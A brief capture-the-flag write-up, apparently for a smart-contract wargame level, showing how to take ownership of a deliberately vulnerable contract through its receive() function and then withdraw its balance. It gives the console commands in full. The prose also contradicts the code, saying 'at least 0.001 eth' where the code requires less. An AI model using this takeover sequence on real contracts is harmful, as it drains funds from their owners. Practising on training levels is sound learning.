## Objective: 
### 1. You claim ownership of the contract
### 2. You reduce its balance to 0

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
  ```
  `receive` needs to be run to take over the contract.
  
  To fulfill this requires us to contribute at least 0.001 eth:
  ```
function contribute() public payable {
    require(msg.value < 0.001 ether);

  ```

  First contribute < 0.001
  ```
  contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
  ```

  Once fulfilled the requirement, we send transaction to contract without calling function so to trigger `receive`
  ```
sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
  ```

  Check if we are owner:
  ```
contract.owner()
// Output: player's address
  ```

Final step withdraw the fund to complete level
```
contract.withdraw()
```
